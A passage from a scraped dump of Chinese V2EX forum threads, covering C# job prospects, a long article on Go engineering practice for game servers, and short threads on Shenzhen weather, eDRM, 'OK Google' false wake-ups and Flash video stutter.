上稍差一点，但是和其他语言的框架没什么区别，打包部署什么的也配备了相应的命令行工具，挺方便\r", "\r", "不过目前 visual studio 还是 windows only ， vscode 的补全什么的支持还是差一些， 开发还是在 windows 上比较好。", "表示今年苏州那块招.net 跟往常比起来贼多。。", " 因为同程在壮大吗？", " 什么厂?", " 同程在转 Java 了吧。。。", "难招，这边招了整整 1 年了也没来人。", "C#开源了，可是也没有很好的反响。现在前端这么火，这语言根本拼不过前端。可能就游戏领域有前途吧", "有，在北京微软，苏州微软最有前途 :)", " #26  ", " 谁告诉你.net 不是开源的？？", "我身边赚到钱的程序员都是用 c#", "呵呵", "unity", "c# 主要是传统软件的开发，包括一些信息化系统， web 等，另一个出路是 unity 。\r", "\r", "我曾经做过一份 c#的工作，后来在拉勾上搜索了下 c#的招聘职位，果断放弃 c#改用其他了。\r", "\r", "不过也遇到其他做 c#的哥们，他的思路是，现在用 c#的（人）那么少，要是主攻 c#，那基本上会有不错的待遇。\r", "\r", "供君参考。", "互联网行业没啥用途，但是其他行业又不是没用途，比如传统软件行业", "很多传统的政企行业应用还在大量用着 C#，所以前途不前途的讨论没什么意义。", "python 轉 c#的路過~ 在二線以下城市 ", " 工作超好找, 微軟還活著竟然有人認為 c#不行了", "整个河北所有市县 都在用一体化平台 含 预算编制 国库支付 电子凭证和印章 全是 C#的。。 C#做硬件也很好 发卡系统 + 后台 一个项目几十万 够花不？ 不过这里大部分 v 友貌似都喜欢 linux 环境 喜欢 ios 开发 所以。。。。", "asp 和 vb 遗弃的有些可惜。本来也是一套独立语系支撑一方的。现在好了， ", " 不伦不类，古老的 vb6.0 成了最后一版的纯 vb 。 asp 留下了海量建站源码渐渐闲置。 VBA 办公自动化忙自己的。 VBS 隔三差五冒出来一小段干点灵活。\r", "好好的一个语系，弄的支离破碎。", "谁叫它之前之前只支持 windows..", " 转的缓慢无比...", "cocos-xna + xamarin + monogame 路过,小公司做跨平台小游戏，也不知道有没“钱”途", "Unity 是用的这个，还是很多的~", "不是 c # 没前途 ， 是只会 c # 就真不会有前途了", "微软这种技术上坑了一代又一代程序员的公司，还有人敢跟着他们混。", " 说的好！在微软待了三年多，真正在写 ", " ）的时间最多也就一半，其他时间 PHP ， Python ， JS （ WordPress ， MySQL ， Angular ， React ）都会接触到。吊死在一门语言或者一个平台上肯定是不行的。要有广度，当然也要有深度，选取几个重点发（入）展（坑）", "  ", " 这个就不是很清楚了。。不过我同学说转的挺积极的。。。", "我有关注过一点 c#，说说一己之间：\r", "无论是现在还是未来， c#肯定会有很多人继续用的。\r", "c#及其生态系统在微软大佬的引导下发展不错，有一个良好的社区和一帮拥趸。\r", " ，观察一下人们用 c#做什么很容易得到这个结论。\r", "\r", "比如中国互联网的 bat ，假如没有了 b 大家还可以欢快的生活，但是没有 at ，是不是对很多人的生活就会有影响？同样，如果突然没有了 c/c++， java ， php ， js 如今 it 行业面貌会有大的变化。但是没有 c#，好像也没什么。对吗？", "我用 C++， QT 怎么整", "有没有前途还是用户说了算啊。。。。。", "只有我觉得帮助文档打开很慢吗？", "我们在招 c#。。。", " core 的运行效率很高的，还能运行在 linux 上。\r", "\r", "我觉得很有前途。", " 还得看究竟用着干什么", "java 和 c#互相转应该压力比较小吧", "微软全家福都是银行在用。搞互联网的用不上。在搞互联网的眼里没前途是很好的，否则会被很快拉低工资。看看 ios 在搞互联网的眼里曾是多么有前途啊，泯然没前途矣。\r", "\r", "越在他们眼中有前途的东西，最好越别碰", "一大波 c#转 unity 的", "抛开互联网不谈，还是有很多企业开发使用 c#的，需要开发和维护在 windows 上运行的程序，另外.NET Core 前途还不明朗。", " 用来做啥？后端？", "不是很懂只能在一个技术平台工作的程序员", "会开小轿车，皮卡给你就不会开了？", "老板要你这种司机有啥用", "国内节奏比国外要慢个几年的\r", "（来自 docker, angular 的心得", "C#转 JAVA 完全没压力吧  就一门语言好吗\r", "觉的 C#没前途可以转行 应该不难吧。", "学校工作室一群搞.net 的", "楼主自己都说了，“唯一不大行的就是社区生态环境建设上比较落后”， 自问一下背后的原因为什么？", "C# 程序员 X\r", "后端服务程序员 O\r", "\r", "讲道理，解决问题才是核心，语言是次要的，框架是次要的，这些都是没有什么技术含量的东西。", "有钱途，就有前途。\r", "V2 总是出这样的帖子，无奈！", "在北上广，有房子有户口才能有前途 （逃。。。", " c#转 golang 的在这里闷声发大财。。。", "如果只会 C#，那现在这个样子，除非 uwp 能发展起来，否则真完了", "有个高中同学做 c#就很赚钱，现在在成都，貌似能接很多项目。另外，@livid ", " 有空可以 fix 一下上面各种\".net\"的链接。", "从提供第三方云服务的角度看， C# 相关 SDK 使用的概率很低。", " V2EX 的评论内容链接判断没做好，一句话变成链接了 …", "只能想到 unity3d 了 //", " 我一定是去了假微软 😉", " 恩，发现了，不过好像 livid 已经修复了。", " 我才是去了假微软😅", " 说的太对了!", " 。。。。", "c# 去做 unity 吧。。 13k+ 獎金流口水。。", "dotnet Core 会帮他复活的。毕竟可以迁移到 Linux 上，一帮人嗷嗷的往上冲", "1.薪资来讲， Java 普遍比.Net 高些，但是，到了高级后，薪资差别很小，各种语言都是\r", "2.基本上纠结这个的都是 loser ，如果你技术很牛，根本不会有这个纠结\r", "3.要转就转，不要多 BB\r", "4.编程语言和思想都是相通的，真正到高手，切换到其它语言还是高手，渣渣用什么语言都还是渣渣，看过武侠的都知道，再牛的武功秘籍，没内功，练出来也都是渣，内功深厚，弄个叶子就要你命"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2><strong>先从工程说起</strong></h2>\n<p><strong>软件工程三要素</strong></p>\n<p>我创业后，总结了过往工作和创业过程中参与的项目，发现不论做什么，软件工程都回到三个问题上：\n需求。首先，我们会有一个方向。\n时间。大概多长时间做完，需求和时间是关联的。\n资源。我们打算投入的人才类型、人才数量、资金数量、资金能够支撑团队运转多久。</p>\n<p>这三者互相影响。所以，我们在做软件工程时，所有的决策都逃不开这三个因素。区别可能仅仅是当我想做一个小程序，不指望长期地更新它时，代码可能很简单。但如果今天要做一个需要长期更新的游戏，比如当预计更新时间需要一两年时，就不可能随便地定义很简单、很初级的规范，因为这样的东西没有办法长久维持。但是从公司经营的角度看，往往会考虑资金预算，因为时间资源都是有限的。所以，我所有的决策都会落到这三个因素上。</p>\n<p><strong>游戏行业的软件工程</strong></p>\n<p>为了大家更好的理解我的决定，下面和大家分享一下游戏行业的软件工程存在的一些问题：</p>\n<ol>\n<li>需求不确定性很大\n产品设计人员和开发人员的最大矛盾在于需求不确定。如果今天产品设计人员说：“我要做这个东西，需求不会改变。”那么，我相信每一个开发人员都会非常高兴。</li>\n<li>通常会有时间节点的要求\n游戏往往会有时间节点的安排，比如临近一些长假，大家回老家后会减少玩游戏的时间，此时，你需要通过运营活动增加用户留存。它有时间节点性，譬如运营商今天已经约好广告，几点几分开始导量，那么这个行为会影响游戏的增长，所以服务器、版本等都要做好准备，因为不能出现问题。另外，国内游戏普遍存在山寨的问题，但其实山寨也要讲究战术，假如大家都山寨，那么你为了抢占市场先机，必须快速上线。如果是做创意型的游戏，可能需求变动比较大，如果是做创意较低的游戏，时间的要求则会很高。</li>\n<li>稳定性和实时性要求双高\n导量等都是流量变现的生意，稍微有一点折损，回报率就不同。就像刚才的分享，它很精细地去抠用户的到达率，中间下载到底卡在哪个点。其实游戏的稳定性和实时性要求都非常高，大家都玩过游戏，特别是联网型游戏很卡，会造成用户体验很差。网站中，单个页面展示 0.5 s 和 2 s 没有太大差异，但是一款游戏里的操作差到秒级时，用户就会开骂。另外，游戏中玩家的数据很宝贵，因为这些数据是玩家花钱花时间去获得的，所以数据安全性要求特别高。</li>\n<li>人员普遍缺乏工程经验\n参与的人员普遍缺乏工程经验，比较常听到的是“我原来做 xx 领域，现在有兴趣做游戏，就加入游戏行业了。”另外，大部分产品项目都是默默无闻的，上线后没有大量的用户就会消失，大家平时能看到的是极少数，这就是行业现状。我们作为一个公司，没有办法把自己放在一个“这个游戏肯定赚钱，我们的人员素质都很高，我们的需求都非常确定”的角度，我们只能做最坏、最保险的打算。因此，我们会比较现实、客观地剖析所处的环境。</li>\n</ol>\n<p><strong>保持简单</strong></p>\n<p>在这种环境下，我们所能做的只有一件事情：保持简单。保持简单有很多好处：</p>\n<ol>\n<li>门槛低、参与人员要求不高；</li>\n<li>做起来快；</li>\n<li>验证快，当需求不确定的时候，尽早去验证，就可以尽早调整它；</li>\n<li>迭代快，可以快速地调整；</li>\n<li>简单的事情容易说清楚，不容易在沟通中出现误差，比如今天想要做一个东西或者制定一个项目的规范，如果列出手册让程序员按照手册进行编码，相信很多人其实根本不会去看；</li>\n<li>不容易出错；</li>\n<li>出错了也比较容易找到问题的原因。</li>\n</ol>\n<p>把事情做复杂了容易，做简单却比较难。我在团队中一直鼓励大家尽量采用简单的方式实现。</p>\n<p><strong>我采取的策略</strong></p>\n<ol>\n<li>\n<p>自动影射数据库的缓存系统游戏的稳定性和实时性要求双高。当我扔一个 Redis 给大家，业务就往 Redis 访问，数据落地，写到 MySQL 。如此无法保证所有人产出一样质量的设计方式，在小团队中的风险很大。所以，我做了数据库的自动映射，开发的时候只需要与 MySQL 打交道，剩下的事情都交给框架去做，开发的难度就大幅下降，只要你懂得用这套系统，基本上开发出来的程序不会有效率问题，大家的精力就可以放在业务的开发上，不用再去纠结缓存中具体要用什么数据结构去组织、数据要用什么样的方式同步等。</p>\n</li>\n<li>\n<p>贯彻速错理念让程序员以简洁的方式开发业务逻辑，开发的时候只管做正确的事情，错误的东西我不需要去增加代码的复杂度。速错让我们比较早地暴露问题。</p>\n</li>\n<li>\n<p>简单的业务模块管理用一句话就能说清楚的管理方式，稍后也会跟大家分享。</p>\n</li>\n</ol>\n<h2><strong>错误和异常处理</strong></h2>\n<p>Go 和其他编程语言不太一样的是，它把错误和异常分开。 Go 提供了 error 类型用来表达错误，语法上允许函数有多个返回值，因此，返回 error 的设计在 runtime 中随处可见。另外，由于 Go 的普及率不高，所以我列一下代码（如图 1 ， 2 所示），与大家分享一下 Go 的错误写法。</p>\n<p><a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-09-%E4%B8%8A%E5%8D%8810.07.04.png\" rel=\"nofollow\"><img alt=\"图 1\" src=\"http://upload-images.jianshu.io/upload_images/311249-42ca3a6beb42fae9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></p>\n<p>这个函数是两个偶数相加，如果参数不是偶数的话，就会返回一个 error ， error 这个包是 Go 内置的，可以让你快速返回一个错误，不需要重新手动构造错误类型。\n<a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-09-%E4%B8%8A%E5%8D%8810.08.19-1.png\" rel=\"nofollow\"><img alt=\"图 2\" src=\"http://upload-images.jianshu.io/upload_images/311249-09715a5ef891a6fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></p>\n<p>调用它的时候可以通过第二个参数是否 nil 来判断它是否出错，然后把对应的错误信息打印出来。</p>\n<p><strong>错误处理</strong></p>\n<p>有时候只是判断 nil 是不够的，因为有时会有不同的错误类型，我们要针对不同的错误类型来判断，有时候错误中需要附带额外的错误信息。\n有两种常见的做法：</p>\n<ol>\n<li>设置一个全局变量，业务上直接返回全局变量，外部调用时可以判断返回的 error 是不是这个全局变量，因为 error 是引用类型，所以可以通过判断引用来判断是不是某个错误。这种方式在平时用的比较多。</li>\n<li>自己去实现 error 接口，这样可以附带更详细的数据和信息，外部就能取到具体的上下文相关信息。这个做法相对更复杂。</li>\n</ol>\n<p><strong>异常</strong></p>\n<p>运行时抛出：数组越界、空对象、类型断言失败。\npanic() 手动抛出。它的参数是可以任何类型的，函数就不用显示去返回一个 error 。\ndefer() + recover()。\n不捕获进程就会退出。</p>\n<p><strong>速错实践</strong></p>\n<p>只处理业务上定义的错误，不做多余的事。</p>\n<p><a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-08-%E4%B8%8B%E5%8D%883.44.39.png\" rel=\"nofollow\"><img alt=\"图 3\" src=\"http://upload-images.jianshu.io/upload_images/311249-6f960245c1b01dd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a>\n以装备强化（如图 3 所示）为例，如果我们没有实践出错，那一个装备强化的代码逻辑可能是好几个 if ，如数据是否存在等。\n<a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-08-%E4%B8%8B%E5%8D%883.45.35.png\" rel=\"nofollow\"><img alt=\"图 4\" src=\"http://upload-images.jianshu.io/upload_images/311249-40332c703faeff3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></p>\n<p>如图 4 所示，如果是速错的写法，在我们项目中会定义一个 fatal.when 。如果判断这句话是错误，则会出现 panic 。数组访问时不会去额外判断数组长度，因为正常的客户端知道数组长度，如果返回越界，则定义为客户端 BUG 或者非法客户端。另外，数据是否存在也不用管，因为如果访问的时候发现是空对象，它就会抛出来。所以有两个前提，只有错误的客户端逻辑才会触发 fatal 和 panic ，我们不必为外挂开发者提供友好的错误提示，像这种程序错误，我们内部会计入日志，没有必要反馈给客户端。</p>\n<ol>\n<li>\n<p>分清会话级别的异常和业务级别的异常。\n游戏其实有两种可能的异常情况：\na. 会话级别的异常。单个玩家操作某个东西，比如刚才的强化，它可能存在客户端 Bug 。玩家点进去时，链接就会断开，我们把这种常见的错误异常定义为会话级别的异常，它只影响自己、不影响别人。\nb. 业务级别的异常。假设我们有一个玩家在线 PK 匹配系统，假设这个匹配系统的进程因为某一段代码写错挂掉，速度越界，这时业务是没有办法响应所有人请求。此时，我们会直接让进程挂掉，因为业务已经无法响应。因此，业务进程的异常会影响所有人。</p>\n</li>\n<li>\n<p>所有 goroutine 都应有明确的入口。</p>\n</li>\n<li>\n<p>所有入口都应有 recover 和日志记录。</p>\n</li>\n<li>\n<p>绘画入口只记录日志，不抛出异常。</p>\n</li>\n<li>\n<p>业务入口记录日志后，抛出异常让进程崩溃。\n如果不及时让进程挂掉，它可能会产生更严重的问题。早期用 PHP 做页游的时候就遇到这种情况，其实某一段业务逻辑 PHP 执行已经出错，同时把缓存污染。但是，我们的做法并没有直接把这个问题暴露出来，而玩家在已经污染的缓存数据下面跑，数据会越坏越严重，等到玩家向我们反馈他的数据坏掉时，我们已经无法还原，这种问题很让人头痛，因此，我们倾向于在出现问题后，第一时间暴露出来，而不是把它掩盖掉。</p>\n</li>\n</ol>\n<p><strong>实践总结</strong></p>\n<ol>\n<li>\n<p>需要让用户做出响应的错误才需要管。假设我有一个系统，系统告诉玩家他目前余额不足，需要进行充值。余额不足这件事就属于业务上已经定义好需要对应去处理的一个情况，这种就属于业务上面的错误，不属于程序的错误或者异常。</p>\n</li>\n<li>\n<p>模块调用者是模块开发者的用户。\n我们平时做的时候不只是把东西交付给最终用户。其实，我们平时在开发的时候，两个模块互相也是用户关系。那么，我需不需要让调用者知道这个事情，然后由他做出对应处理？如果不需要，则不需要有多余的错误判断和错误反馈。</p>\n</li>\n<li>\n<p>客户端开发者是服务端开发者的用户。\n服务端的信息是不是需要客户端处理？比如，玩家的网络连接故障，那么客户端需要赶快弹出一个界面“我现在正在重连”。此时，错误需要暴露给客户端，并且去判断处理。否则，有一些游戏没有断线重连机制，断掉就是断掉，那么此时应该暴露，而不是掩盖。</p>\n</li>\n<li>\n<p>服务端开发者是自己的用户。\n如果错误没有处理好，最后坑的是自己。如果服务端的错误处理没有写好、客户信息处理不全，可能最后会增加自己查问题的难度。 所以，我的总结关键是第 1 条，需要让用户做出响应的才需要管，不需要响应的不需要做多余判断。这样程序不需要写很多错误判断，其实大部分的错误是直接当异常处理掉。因为，我们在定义业务时，通常不会定义数据库故障时怎么样、网络连接故障时怎么样、通信协议故障时怎么样，通常需求不会到这种级别。因此，这种情况我们当异常处理。</p>\n</li>\n</ol>\n<h2><strong>interface 的应用</strong></h2>\n<p><strong>interface 是 Go 的核心</strong></p>\n<p>大家可能更多的是听到 Go 在并发方面的特性，其实 Go 在面向对象方面，跟其他的语言也有很大差异。我认为 interface 在 Go 里面非常重要，如果没有正确理解 interface ，那么 Go 就没有被正确理解。</p>\n<p>interface 有两个很重要的特性：</p>\n<ol>\n<li>它的实现是隐式的；</li>\n<li>interface 可以组合出来。\n<a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-08-%E4%B8%8B%E5%8D%883.40.26.png\" rel=\"nofollow\"><img alt=\"图 5\" src=\"http://upload-images.jianshu.io/upload_images/311249-c4ca90eeb993d5ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></li>\n</ol>\n<p>如图 5 所示， interface 的实现是隐式的特点，可能在工程实践中会引发一些问题。如看到这个类型时，不知道这个类型具体实现了哪些接口。有一个小技巧是通过匿名的全局变量，做一个类型转换，这样在编译时期就能暴露问题，如果 MyImplement 没有实现 MyInterface ，那么编译就无法实现。比较常见的误解是， MyImplement 前面有个星号，这是它的指针类型，这个方法是实现在这个结构体的指针类型上的。调用时，有些地方可能不小心会写成结构体类型，然后就会出现编译失败。因为，结构体和结构体指针是不一样的。</p>\n<p><strong>io 包是最好的示例</strong></p>\n<p>io 包定义了实现 io 所需的基本接口（譬如读、写、关闭）。通过基本接口组装出不同的复合型接口 （譬如，同时支持读写的 io ，和同时支持读写关闭的 io ）。举例， Reader Writer Closer 分别是 3 个接口。如果某个 io 是只读，就只需要实现 Reader ，如果某个 io 是只写，就只需要实现 Writer ，有一些 io 是不可关闭的，不一定可以实现 Closer ，所以这三个是分开的。这三个最基本 interface 又可以重新组装，这是 Go 很重要的一个特性。另外，在 os 包中就实现了文件 io ， net 包实现了网络 io ， bytes 包实现了内存 io ， bufio 包实现了带缓存的 io ， bufio 包利用接口解耦了底层 io 实现。</p>\n<p><strong>依赖注入</strong></p>\n<p>业务模块不像 runtime ，交叉引用很常见。但 Go 不允许 package 之间交叉引用。所以我们需要换一种思路，业务模块只要声明它想要什么，要的东西从哪里来不用业务模块管。这是一个依赖注入的过程，依赖注入实现起来非常简单，不需要很重的框架去实现。</p>\n<p><a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-08-%E4%B8%8B%E5%8D%884.06.15.png\" rel=\"nofollow\"><img alt=\"图 6\" src=\"http://upload-images.jianshu.io/upload_images/311249-93b1bd377efdc03c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></p>\n<p>如图 6 所示的例子。 module 包负责管理所有的业务模块，通过 IPlayer 、 IEquip 声明具体的业务模块需要提供什么样的方法，然后再通过对应的全局变量，去存放这两个口的具体实现，这是很简单的依赖注入的方式。譬如，图 6 中的 Player 模块可以引入 module ，然后把自己注入到 module 的 player 实现当中。譬如玩家注册送装备，就可以调用装备模块送装备，而不会直接地调装备模块，会变成间接的。只要依赖 module ，然后把自己注册进去就可以。</p>\n<p>装备模块也相同，启动的时候把自己注册进去，可能装备升级的时候要扣钱，可能对应的调用玩家模块，只需要调 module.player 即可，无需注意它是在哪里实现的。最关键的一点，这个 module 作为总的模块管理的一个包，我们可以在一份文件里面很清楚的看到，业务对外提供哪些方法，哪些接口。平时，我在 review 代码时，基本只看这一份。</p>\n<p><strong>实践总结</strong></p>\n<p>接口在 Go 语言中是非常重要的，要重点掌握。接口的运用是很灵活的，脑筋要会急转弯。解耦并不需要很厚重的封装。可以恶心自己，但不要恶心别人。</p>\n<h2><strong>去 DSL 的尝试</strong></h2>\n<p>我们在通信协议上有一套自己的 DSL ，但在实际应用中存在一个问题，即它的功能隐藏在语法中，甚至有一些功能隐藏在工具参数背后，同样的文档通过不同的命令行参数生成的长度也不同，因此，这里有一个学习成本。</p>\n<p>开发人员在设计 DSL 时，脑海中需要联想原生的语言最终生成出来会是什么，比如客户端对应生成什么、服务端对应生成什么。其实，大脑有一定的工作负担。当大家在写开源项目，譬如 markdown 文件时，如果没有可视化工具辅助，你要在脑海里面联想，写出来的东西最后别人看到是什么样的，而所有的 DSL 都会有这样一个问题。</p>\n<p>另外，开发的过程中，我需要反复地在工具间切来切去，可能需要改一下 DSL 的描述，然后切到命令行生成代码，再切回来看对应的生成产物，再继续编写代码。大家在这一块的工作其实并不流畅。而 Go 的代码很清晰简洁，没有多余的符号，因此，一份代码本身就是一份很好的文档。\n<a href=\"http://blog.qiniu.com/wp-content/uploads/2017/02/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2017-02-08-%E4%B8%8B%E5%8D%883.46.46.png\" rel=\"nofollow\"><img alt=\"图 7\" src=\"http://upload-images.jianshu.io/upload_images/311249-113ffbdf58a28a2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></a></p>\n<p>如图 7 所示，大家一看就知道每个字段的用处。那么，如何有效利用代码本身呢？我想了一个办法，即让大家去写 Go 的代码，只要把 Go 的代码写好，针对这份代码去生成对应的客户端的代码和序列化的东西，就不用在 DSL 上来回切换，这就是我们的一个 RPC 参数返回值，直接写到代码即可，不需要到 DSL 里面去切，写出来的样子即最后的样子。我们对通信协议中用到的数据类型做了简单的归纳，其中用到的类型很简单。简单类型：整形、浮点型，复合类型：自负串、数组、 slice 、 map 、指针、结构体。只要这几个实现了，就可以进行组合，已经完全满足平时使用。</p>\n<p><strong>基于 AST 的实现</strong></p>\n<p>Go 的 runtime 中提供了解析 Go 代码所需的库，一开始在小规模用的时候我们觉得很舒服， go/passer 一分析，就可以拿到里面的结构体字段、类型。 go/doc 可以分析注释中的特殊符号，比如通过注释的约定，去约定要不要生成结构体对应的代码。 Go 的 template 包做代码生成，把代码生成逻辑和代码分析逻辑做解耦。 Go generate 用于代码生成，原理比较简单，它负责把代码读进来，你的工具就可以取到代码做分析，把它转成新的产物。但是用 AST 的一个问题是，往后继续加工会发现，包引用关系不好分析。单份文件读的时候很方便，但是分析整个项目时，包引用关系的分析比较难。另外，类型转义不太好分析，持续增加功能的时候代码变得异常复杂。 types 包也许可以帮忙，它起到一定的简化作用，但是毕竟我们项目做的比较匆忙。因此，这个东西就没有花太多时间继续深入。</p>\n<p><strong>基于反射的实现</strong></p>\n<p>后来，因为需要继续往上叠功能，所以我们改成用基于反射去实现，这样相对简单，因为类型信息提供得很详尽，代价是要注册类型，并且需要编译两次代码，这是反射的代价。反射虽然让工具变得更简单，但是需要付出这样的成本。关闭编译优化可以缓解一下。</p>\n<p><strong>优化 RPC</strong></p>\n<p>另外，我们实现了反序列化格式后，顺便又优化了 RPC 。 Go 原生的 RPC 序列化有一些限制性。 Gob 支持 BinaryMarshaler 和 BinaryUnmarshaler 接口。生成对应方法，类型的序列化和反序列化就被接管了。基于原生 RPC 包，稍微封装一下就得到了符合项目需要的 RPC 。一个 RPC 接口在一个代码中就可以看得一清二楚，不用再到别的地方看，这是我们目前做起来最舒服的一点。</p>\n<p><strong>实践总结</strong></p>\n<p>适合服务端只用 Go 以及客户端语言单一的项目。但是这个东西是有限制的，这就是格局问题。当你在做一个东西的时候，你的定位需要考虑很多人的需求，可能相应地在要在开发效益和使用体验、调用效率上做一些牺牲，来换取一些通用性。我们这种做法，由于项目的周期是比较短，不会与很多客户端配合做很长时间，所以适合服务端只用 Go 以及客户端语言单一的项目。但是如果要做多语言的协作，还是建议用行业标准的做法。多语言协作的项目推荐 Protobuf 、 JSON 。</p>\n<p>另外可视化也是一种选择。 DSL 的优化不只是把 DSL 干掉这一条路，譬如 markdown 虽然书写时，最终产物不直观，但是可以通过工具辅助达到比较好的编辑体验。</p>\n<p>最后，基于我刚才所分享的内容，我想讲一些自己的感想。在做项目时，不同的公司愿景不一样，人员组成不一样，它所产生的架构差异会非常大。像刘奇老师的做法，它选择去和更多人配合，部署一个更大的格局，就需要去选择一些行业通用的标准，尽量避免去做一些特殊化的东西。</p>\n<p>反过来，一个愿景很小、时间很短的项目，并且没有外部合作的预期，它产生出来的东西就是大量的专属化定制。因为人员问题、资金问题、周期要求问题，产生出来的东西开发效率会不一样。</p>\n</div></div>"], "reply": "10", "tittle": "Go 在游戏行业中的工程实践", "comment": ["1024", "好像没看到广告部分呢 +-_-", " 分享的干货 哈哈哈", "-- [[\r", "自动影射数据库的缓存系统游戏的稳定性和实时性要求双高。当我扔一个 Redis 给大家，业务就往 Redis 访问，数据落地，写到 MySQL 。如此无法保证所有人产出一样质量的设计方式，在小团队中的风险很大。所以，我做了数据库的自动映射，开发的时候只需要与 MySQL 打交道，剩下的事情都交给框架去做，开发的难度就大幅下降，只要你懂得用这套系统，基本上开发出来的程序不会有效率问题，大家的精力就可以放在业务的开发上，不用再去纠结缓存中具体要用什么数据结构去组织、数据要用什么样的方式同步等。\r", "]]\r", "\r", "这里的部分能讲下实现么。（好奇脸", "赞美干货！", " 头像已经是了", "完美", "好干，喝口水先", " 说的也许是 mysql 中的自定义方程， trigger 什么的，以及第三方库可以和其他程序打通。\r", "\r", "这点，我们也用。不过套路不一样。\r", "我们用的是 postgresql 数据库和其他的 memcache 方案。感觉比 redis 好且稳定。 psql 比 mysql 更加强大。当然 learning curve 也是很大的。\r", "\r", "上的什么 nosql shards, cluster 什么的也是能极大加快我们的业务反应速度。当然我们做的不是游戏行业。有了整套的系统框架了，再做事，就非常简单了。", " \r", " \r", "我觉得是规范 sql 语句， 在 orm 层面插入语义分析， 然后进行缓存操作。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>准备带两个薄一点的摊子，还有一个大一点的被子，被子要不要带呢？现在要是直接盖俩摊子应该也不会很冷吧。</p>\n</div></div>"], "reply": "20", "tittle": "深圳天气如何？要带一个被子去了？", "comment": ["每个人适应情况不同=  =\r", "我现在一个被子，然后 23 度冷空调，今天早上空调调整到 24 ，\r", "但是我觉得不如当地买比较方便。", "今天降温\r", "\r", " 如果不开空调还有必要带被子吗？", " 快忘记二十多度是什么感觉了。", "直接买吧，还带啥呀", "再过一个星期从北方回深圳，很期待南方的温度", " 也是这样想。", " +1", " 去年冷的时候也从家里寄了床棉絮过来了.带着年底用勒.", "一件毛毯，最冷的时候就是 2 件毛毯", " 我那个被子也是买的，感觉东西多，实在拿不下。", " 我那个不是纯毛毯，是那种夏天该的那种，不是很厚。", "再过半个月 就短袖了", " 没有吧，现在都穿什么了？", "现在(2017 年 2 月 9 日 17:30:45)很冷", "广东开始变冷了，最低 5 度。", "最近有点冷，可能过半个月开始回暖\r", "睡觉带个厚点毛毯就够了，我现在每天睡榻榻米+毛毯", " 准备不带被子，带两个摊子", "倒春寒还是有点的，不过被子和房间相关可以通过空调调节，楼主多带一两件春秋衣物即可。", "看到最后才明白过来，原来“摊子”=“毯子”"]},
{"content": ["<div class=\"topic_content\">有一个活， 就是要把现有的目录 或者文件 打包成 eDRM 格式， 对这个基本毫无了解。 这个 eDRM 格式是什么样的格式？ <a target=\"_blank\" href=\"http://www.edrm.net/\" rel=\"nofollow\">http://www.edrm.net/</a> 只有个 xml 的标准，难道改成 xml 就可以？  我原来用过的 eDRM 服务， 保障文件安全，只能在公司被使用， 可以和 office 这种集成，当打开的时候 是需要权限的，靠一个 xml 怎么做。求指导</div>"], "reply": "1", "tittle": "有大神知道 eDRM (eDiscovery) 吗？", "comment": []},
{"content": ["<div class=\"topic_content\">还有开会的时候， OK, Google 也经常被唤醒，很尴尬啊！</div>"], "reply": "13", "tittle": "OK, Google！总在我看视频时被视频唤醒怎么办？", "comment": ["在 google 设置里可以关闭。", " 不是要关闭，我是要用它啊！就是误判太多了！", "谷歌就没想到这点吗？\r", "自己被自己叫醒了", "锁屏的时候唤醒，不是要自己的声音才可以吗？", "我是经常唤不醒，发音欺负太差劲😓😓😓", "不是有声音模型！", " 但是在开会的时候，开着开着，就自己醒了：）\r", "\r", " 正好相反了\r", "\r", " 可能是我的声音太普通了-_-!", "Google Home 也是在 Google 超级腕广告中被唤醒 \r", " 可以试试开启信任语音模型", "🔇就好了", " 看来我不是一个人\r", "\r", " 那样被侦测到的就更广泛了", "开启自定义唤醒关键词功能，然后录入“压咩跌”，我想这个声音开会时候一般不会出现吧，除非是日本公司", " 那在人多的地方怎么办"]},
{"content": ["<div class=\"topic_content\">首次发现这个问题大约在 2 月份以后 具体哪天不知道\r<br>\r<br>直观感觉就是 pptv letv 的体育直播，开到 720p 以上分辨率，视频分片衔接处一顿一顿的\r<br>\r<br>已经技术手段排除网络延迟原因，然后同时出现，他俩的播放器不一致，那么应该关键就是 flash 播放器了\r<br>\r<br>\r<br>但是我的 flash 我禁止了静默更新，每次更新必须弹出来窗口让我确认，我轻易不更新 flash 播放器，现在太蛋疼了\r<br>\r<br>我的环境： win7 x64 chrome 浏览器内置 flash player, chrome 55/ 56 都是这样\r<br>\r<br>因为日常工作机配置较低，为了防止是解码能力不足导致高分辨率卡顿，特意开了一台旗舰 X64 的 windows 机，这个问题依旧</div>"], "reply": "31", "tittle": "我比较确信，近期 windows 平台下的 flash 播放器出了一些问题，主要在视频直播的播放器上问题凸显比较厉害，有没有遇到问题的朋友", "comment": ["随便贴个视频连接我试试看", " #1 \r", "这会儿没有清晰度比较高的直播啊\r", "回看的也有问题 但是不太严重 不如直播那样每个分片衔接都顿\r", "\r", "比如这个 \r", "\r", "pptv 满地免费会员 如果您有免费会员 开蓝光清晰度 随便把进度条往中间拉一下\r", "可以清晰感受到部分分片的顿", "乐视的也有问题 问题更轻一些\r", "\r", "你仔细观察 会感觉到分片切换的时刻 播放速度发生变化 突然变成 0.9 倍 然后突然加快到 1.x 倍 